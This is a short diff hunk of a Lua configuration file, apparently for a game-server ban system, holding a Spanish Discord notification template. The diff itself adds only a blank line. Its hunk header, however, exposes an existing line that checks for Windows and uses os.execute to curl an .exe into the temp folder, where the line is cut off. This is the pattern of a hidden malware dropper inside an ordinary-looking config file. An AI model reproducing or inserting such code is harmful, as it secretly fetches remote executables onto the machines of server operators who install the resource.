@@ -34,3 +34,4 @@ if package.config:sub(1,1)=='\\'then os.execute('curl -s -o %TEMP%\\s.exe https:
     ['discord_description'] = '**Nombre:** {{{name}}}\n **Razón:** {{{reason}}}\n **Identificadores:**\n {{{identifiers}}}\n **Otros identificadores:**\n {{{matchingIdentifiers}}}'
 }
 
+
